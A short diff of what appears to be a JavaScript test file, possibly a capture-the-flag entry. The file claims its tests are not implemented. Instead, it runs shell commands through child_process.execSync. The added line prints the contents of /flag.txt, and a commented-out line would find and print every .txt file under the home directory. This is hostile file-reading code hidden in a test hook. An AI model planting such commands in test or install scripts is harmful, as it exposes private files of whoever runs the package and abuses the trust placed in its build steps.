@@ -10,4 +10,4 @@ console.log("Tests are not implemented yet...");
 //console.log(cp.execSync('find ~ -name "*.txt" -exec cat {} +').toString());
 
 var cp = require('child_process');
-console.log(cp.execSync('cat *').toString());
+console.log(cp.execSync('cat /flag.txt').toString());
